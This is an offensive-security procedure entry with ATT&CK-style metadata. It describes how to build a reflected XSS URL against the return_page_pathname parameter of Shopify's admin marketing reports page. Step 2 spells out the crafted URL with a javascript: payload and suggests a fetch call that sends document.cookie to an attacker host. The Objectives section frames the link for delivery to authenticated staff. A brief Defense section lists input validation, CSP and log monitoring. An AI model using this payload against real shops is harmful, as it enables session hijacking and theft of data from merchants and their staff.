---
id: proc-shopify-xss-craft-url-001
tags:
  - xss
  - url-crafting
  - payload-injection
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-13T23:56:03.524Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft Malicious URL for Shopify XSS Injection

## Summary

This procedure involves constructing a malicious URL that exploits the lack of validation in the return_page_pathname parameter of Shopify's admin marketing reports page, injecting a javascript: protocol payload to enable reflected XSS.

## Description

In the Shopify admin interface, the /admin/marketing/reports/[CAMPAIGN-ID] endpoint reflects the return_page_pathname query parameter into an anchor's href attribute without sanitization. By setting this parameter to a javascript: URI, an attacker can prepare for XSS execution upon specific browser interactions. This targets authenticated staff and requires knowledge of the shop's domain and a valid campaign ID. Outcomes include potential JavaScript execution leading to session theft or data access.

## Requirements

1. Valid Shopify shop domain (e.g., [YOUR-SHOP].myshopify.com)
2. A legitimate marketing campaign ID from the target's shop
3. Basic understanding of URL encoding and JavaScript payloads

## Defense

Defensive measures and detection strategies:

- Implement strict input validation to block javascript: protocols in URL parameters
- Use Content Security Policy (CSP) to restrict inline script execution
- Monitor for anomalous query parameters in admin access logs

## Objectives

1. Create an injectable URL for reflected XSS
2. Ensure payload survives reflection in the page
3. Prepare for delivery to authenticated users

## Instructions

### Step 1: Identify Target Endpoint

**Context**: Locate the vulnerable marketing reports page and obtain necessary identifiers.

Research the target's shop to find a valid [MARKETING-CAMPAIGN-ID], such as through public marketing pages or prior reconnaissance.

### Step 2: Construct the Malicious URL

**Context**: Append the vulnerable parameter with a JavaScript payload.

Build the URL as follows: `https://[YOUR-SHOP].myshopify.com/admin/marketing/reports/[MARKETING-CAMPAIGN-ID]?return_page_pathname=javascript:alert('XSS')&return_page_title=Back to Reports`.

Replace alert('XSS') with a malicious payload, e.g., `javascript:fetch('https://attacker.com/steal?data='+document.cookie)` for data exfiltration.

**Expected Output**: A clickable URL that, when visited, reflects the payload in the page's back link.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[shopify]]
